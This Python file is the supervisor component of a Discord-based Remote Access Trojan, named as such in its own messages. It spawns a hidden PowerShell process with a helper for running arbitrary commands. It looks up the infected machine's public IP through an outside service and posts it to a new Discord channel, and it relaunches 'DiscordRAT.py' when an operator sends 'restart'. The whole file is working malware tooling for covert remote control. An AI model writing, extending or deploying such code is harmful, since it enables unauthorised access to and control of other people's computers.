from discord.ext import commands
from pathlib import Path
import discord
import urllib.request
import requests
import subprocess
import inspect
import shutil
import time
import os
import sys

DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """
    
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())
    return "\n".join(output)

@client.event
async def on_ready():
    global channel
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("reconnect: " + ip)
    
    await channel.send(f"```This is the supervisor script for the Discord Bot, if you wish to connect back to {ip} then send the command \"restart\". If you wish to terminate this supervisor script then send the command \"stop\".```")

stop_confirm = False

@client.event
async def on_message(message):
    global stop_confirm
    content = message.content.lower()
    
    if not channel or message.channel.id != channel.id:
        return
    if message.author.bot:
        return
    
    if stop_confirm:
        if content in ("y", "yes"):
            await message.channel.send("```Discord Remote Access Trojan is terminating...```")
            await client.close()
            return
        elif content in ("n", "no"):
            stop_confirm = False
            await message.channel.send("```Termination cancelled, supervisor script will remain running until \"STOP\" or \"RESTART\" is sent```")
            return

    if content == "stop":
        stop_confirm = True
        await message.channel.send("```Session is being terminated completly, are you sure you want to continue (Y/N):```")
        return
    if content == "restart":
        await message.channel.send("```Restarting...```")
        time.sleep(3)
        subprocess.Popen(["python", "DiscordRAT.py"])
        time.sleep(3)
        await message.channel.send("```Discord Remote Access Trojan has successfully restarted.```")
        await client.close()
        return
    
    await message.channel.send("```Please enter a vaild command```")
    
client.run(DISCORD_TOKEN)
